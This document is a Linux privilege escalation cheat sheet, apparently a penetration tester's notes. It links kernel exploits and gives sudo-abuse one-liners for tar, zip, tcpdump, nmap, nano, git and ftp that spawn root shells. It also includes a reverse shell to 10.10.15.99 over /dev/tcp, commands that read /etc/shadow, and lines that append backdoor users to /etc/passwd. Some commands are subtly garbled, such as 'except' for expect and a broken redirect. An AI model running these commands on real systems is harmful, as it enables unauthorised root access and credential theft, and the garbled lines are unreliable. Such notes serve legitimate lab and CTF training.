# Privilege Escalation

## Tools

- BeRoot: <https://github.com/AlessandroZ/BeRoot/tree/master/Linux>
- unix-privesc-check: <https://github.com/pentestmonkey/unix-privesc-check>
- linuxprivchecker.py - <http://www.securitysift.com/download/linuxprivchecker.py>
- LinEnum - <https://github.com/rebootuser/LinEnum>

## File Permissions

- Check file permissions of /etc/passwd and /etc/shadow

Find writable files

```
find -type f -maxdepth 1 -writable
```

Generate password hash (md5):

```
openssl passwd -1
```

```
echo 'joske' | openssl passwd -1 -stdin
```

Generate password hash (sha256):

```
python -c "import crypt; print crypt.crypt('joske')"
```

## SUID / SGID Binaries

Find SUID

```
find . -perm /4000
```

Find GUID

```
find . -perm /2000
```

Find SUID / SGID

```
find . -perm /6000
```

Find and ls SUID / SGID

```
find "$DIRECTORY" -perm /6000 -exec ls -la {} \;
```

## Searching world writable files

```
find / -perm -w ~ -type l -ls 2?/dev/null
```

## Plain text username / password

```
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
```

## Commands with sudo

```
sudo -l
```

## New file Permissions

```
umask
```

## Exploits

- Mempodipper compiled (Ubuntu 11 -> gimmeroot.c)
- Ubuntu (<= 18.10) - Dirty Sock: <https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html>

  - <https://github.com/initstring/dirty_sock/>

- Ubuntu 14.04 and 16.04: (CVE-2017-1000112) <https://cxsecurity.com/issue/WLB-2018010018>

- Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)

  - <https://www.exploit-db.com/exploits/14339>
  - HTB: Beep

- [GNU Screen 4.5.0 - Local Privilege Escalation - https://www.exploit-db.com/exploits/41154](https://www.exploit-db.com/exploits/41154) - Nice example for learning exploit writing

- CVE-2010-2961 - Ubuntu 10.04/10.10) - Local Privilege Escalation
  - mountall.c in mountall before 2.15.2 uses 0666 permissions for the root.rules file, which allows local users to gain privileges by modifying this file.
  - http://www.outflux.net/blog/archives/2010/10/13/mountall-umask/
  - https://www.ethicalhacker.net/features/root/tutorial-hacking-linux-with-armitage/

### overlayfs

- Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation: <https://www.exploit-db.com/exploits/37292>
- Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1): <https://www.exploit-db.com/exploits/39166>
- Linux Kernel 4.3.3 - 'overlayfs' Local Privilege Escalation (2): <https://www.exploit-db.com/exploits/39230>

## Tar

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

```
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.15.99/8082 0>&1' > a.sh
tar -cvf a.tar a.sh
sudo tar -xvf a.tar --to-command /bin/bash
```

## Zip

```
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
```

## Strace

```
sudo strace -o/dev/null /bin/bash
```

## tcpdump

```
echo $’id\ncat /etc/shadow’ > /tmp/.shell
chmod +x /tmp/.shell
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell-Z root
```

## nmap

```
echo "os.execute('/bin/sh')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

## scp

```
sudo scp -S /path/yourscript x y
```

## except

```
sudo except spawn sh then sh
```

## nano

```
sudo nano -S /bin/bash
```

type your command and hit CTRL+T

## git

```
sudo git help status
```

type: !/bin/bash

## gdb/ftp

```
sudo ftp
```

type : !/bin/sh

## Add user with passwd

```
echo 'user2:*:1002:1003:,,,:/home/user2:/bin/bash' >> /etc/passwd
passwd user2

echo "user2:`openssl passwd -1 -salt user3 pass123`:1002:1003:,,,:/home/user2:/bin/bash" >> /etc/passwd

echo "user2:`mkpasswd -m SHA-512 pass`:1002:1003:,,,:/home/user2:/bin/bash" >> /etc/passwd

echo "user2:`python -c 'import crypt; print crypt.crypt("pass", "$6$salt")'`:1002:1003:,,,:/home/user2:/bin/bash" >> /etc/passwd

echo "user2:`perl -le 'print crypt("pass123", "abc")'`:1002:1003:,,,:/home/user2:/bin/bash" >> /etc/passwd

echo "user2:`php -r "print(crypt('aarti','123') . \"\n\");"`:1002:1003:,,,:/home/user2:/bin/bash" >> /etc/passwd
```

## Add root user

```
adduser username
usermod -aG sudo username

```

## References

- <http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/>
- Linux Local Privilege Escalation via SUID /proc/pid/mem Write - <https://git.zx2c4.com/CVE-2012-0056/about/>
- <https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt>
